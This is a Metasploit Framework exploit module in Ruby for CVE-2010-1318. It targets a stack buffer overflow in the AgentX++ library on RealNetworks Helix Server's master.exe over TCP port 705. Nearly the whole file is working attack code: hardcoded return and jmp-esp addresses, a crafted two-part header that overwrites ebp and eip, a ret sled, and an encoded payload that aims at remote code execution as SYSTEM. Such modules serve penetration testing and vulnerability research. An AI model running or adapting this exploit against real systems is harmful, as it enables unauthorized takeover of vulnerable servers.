##
# $Id: agentxpp_receive_agentx.rb 9236 2010-05-06 00:19:20Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp
	#include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AgentX++ Master AgentX::receive_agentx Stack Buffer Overflow',
			'Description'    => %q{
					This exploits a stack buffer overflow in the AgentX++ library, as used by
				various applications. By sending a specially crafted request, an attacker can
				execute arbitrary code, potentially with SYSTEM privileges.

				This module was tested successfully against master.exe as included with Real
				Network\'s Helix Server v12. When installed as a service with Helix Server,
				the service runs as SYSTEM, has no recovery action, but will start automatically
				on boot.

				This module does not work with NX/XD enabled but could be modified easily to
				do so. The address
			},
			'Author' 	     => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9236 $',
			'References'     =>
				[
					[ 'CVE', '2010-1318' ],
					[ 'OSVDB', '63919'],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=867' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					#'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 1024,  # plenty of space
					'BadChars' => "",    # none!
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xc4\xf0\xef\xff\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ '??',
						{
							# The BufAddr varies :-/
							#'BufAddr' => 0xea3800,
							'BufAddr' => 0x1053880,
							'BufSize' => 25000,     # If this is too large, the buf is unmapped on free
							'Ret' => 0x428242,      # mov esp,ebp / pop ebp / ret in master.exe
							'JmpEsp' => 0x7c3d55b7  # jmp esp from bundled msvcp71.dll
						}
					]
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Apr 16 2010'))

		register_options([Opt::RPORT(705)], self.class)
	end

	def exploit
		print_status("Trying target #{target.name}...")

		connect
		print_status("Triggering the vulnerability... Cross your fingers!")

		num = target['BufSize']
		num_str = [num].pack('N')

		# First send 19 bytes to almost fill the buffer...
		hdr = ''
		hdr << [0x01, rand(256), 0x10 | rand(256), rand(256)].pack('CCCC')
		hdr << rand_text(16 - hdr.length)
		#hdr << "QQQQRRRRSSSS"
		hdr << num_str[0,3]
		sock.put(hdr)

		# Wait to make sure it processed that chunk.
		sleep(0.5)
		#print_status("press enter to trigger..."); x = $stdin.gets

		# Send the rest (smashed!)
		hdr = ''
		hdr << num_str[3,1]

		# NOTE: this stuff is extra, but doesn't count towards the payload..
		hdr << rand_text(8)
		#hdr << "EEEEFFFF"

		# becomes ebp
		#hdr << "\xeb" * 4
		base = target['BufAddr']
		new_ebp = base + (num / 2)
		if (mod4 = (num % 4)) > 0
			# align to 4 bytes
			new_ebp += (4 - mod4)
		end
		hdr << [new_ebp].pack('V')

		# becomes eip
		#hdr << "\xef\xbe\xad\xde"
		hdr << [target.ret].pack('V')

		# NOTE: sending more data will smash the low (up to 3) bytes of the socket handle -- no fun
		sock.put(hdr)

		# Send the data that we said we would...
		stack = []
		stack << target['JmpEsp']

		num_rets = (num - payload.encoded.length - 4) / 4
		num_rets.times {
			# points to ret instruction
			stack.unshift(target.ret + 3)
		}

		stack = stack.pack('V*')
		stack << payload.encoded
		# make sure we have all the bytes, or we wont reach the path we want.
		stack << rand_text(num - stack.length)

		sock.put(stack)

		handler
		disconnect
	end

end

